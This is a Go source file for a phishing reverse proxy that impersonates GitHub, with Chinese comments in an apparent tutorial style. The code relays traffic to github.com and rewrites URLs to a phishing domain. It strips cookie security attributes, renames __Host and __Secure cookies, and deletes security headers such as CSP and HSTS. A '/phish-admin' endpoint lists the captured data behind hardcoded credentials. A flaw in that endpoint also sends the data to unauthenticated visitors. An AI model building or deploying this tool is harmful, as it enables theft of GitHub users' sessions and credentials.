package main

import (
	"flag"
	"log"
	"net/http"
	"strings"

	"go-phishing/db"
	"go-phishing/request"
)

const upstreamURL = "https://github.com"

var (
	phishURL string
	port     string
)

// 用來 handler 所有 request
func handler(w http.ResponseWriter, r *http.Request) {
	req := request.CloneRequest(r, upstreamURL, phishURL)
	// 取得 body & header
	body, header, statusCode := request.SendToUpstream(req)
	body = request.ReplaceURL(body, header, upstreamURL, phishURL)

	// 用 range 把 header 中的 Set-Cookie 欄位全部複製給瀏覽器的 header
	for _, v := range header["Set-Cookie"] {
		// 把 domain=.github.com 移除
		newValue := strings.Replace(v, "domain=.github.com;", "", -1)
		// 把 secure 移除
		newValue = strings.Replace(newValue, "secure;", "", 1)
		// 幫 cookie 改名
		// __Host-user-session -> XXHost-user-session
		// __Secure-cookie-name -> XXSecure-cookie-name
		newValue = strings.Replace(newValue, "__Host", "XXHost", -1)
		newValue = strings.Replace(newValue, "__Secure", "XXSecure", -1)

		w.Header().Add("Set-Cookie", newValue)
	}

	// Set-Cookie 之前已經有複製而且取代 secure, domain 了
	// 所以複製除了 Set-Cookie 之外的 header
	for k := range header {
		if k != "Set-Cookie" {
			value := header.Get(k)
			w.Header().Set(k, value)
		}
	}

	// 把安全性的 header 統統刪掉
	w.Header().Del("Content-Security-Policy")
	w.Header().Del("Strict-Transport-Security")
	w.Header().Del("X-Frame-Options")
	w.Header().Del("X-Xss-Protection")
	w.Header().Del("X-Pjax-Version")
	w.Header().Del("X-Pjax-Url")

	// 如果 status code 是 3XX 就取代 Location 網址
	if statusCode >= 300 && statusCode < 400 {
		location := header.Get("Location")
		newLocation := strings.Replace(location, upstreamURL, phishURL, -1)
		w.Header().Set("Location", newLocation)
	}

	w.WriteHeader(statusCode)
	// 取代後的 body
	w.Write(body)
}

func adminHandler(w http.ResponseWriter, r *http.Request) {
	// 取得使用者輸入的帳號密碼
	username, password, ok := r.BasicAuth()

	// 判斷帳密對錯
	if username == "username" && password == "password" && ok {
		// 對的話就從資料庫撈資料
		strs := db.SelectAll()
		w.Write([]byte(strings.Join(strs, "\n\n")))
	} else {
		// 告訴瀏覽器這個頁面需要 Basic Auth
		w.Header().Add("WWW-Authenticate", "Basic")

		// 回傳 `401 Unauthorized`
		w.WriteHeader(401)
		w.Write([]byte("不給你看勒"))
	}

	// 用昨天寫好的 db.SelectAll() 撈到所有資料
	strs := db.SelectAll()

	// 在每個字串之間加兩個換行再傳回前端
	w.Write([]byte(strings.Join(strs, "\n\n")))
}

func main() {
	// 把 --phishURL=... 的值存進變數 phishURL 裡面
	// 預設值是 "http://localhost:8080"
	// "部署在哪個網域" 是這個參數的說明，自己看得懂就可以了
	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部署在哪個網域")
	// 把 --port=... 的值存進變數 port 裡面
	// 預設值是 ":8080"
	flag.StringVar(&port, "port", ":8080", "部署在哪個 port")
	flag.Parse()

	// 先連接到 DB
	db.Connect()

	// 路徑是 /phish-admin 才交給 adminHandler 處理
	http.HandleFunc("/phish-admin", adminHandler)

	http.HandleFunc("/", handler)
	log.Fatal(http.ListenAndServe(port, nil))
}
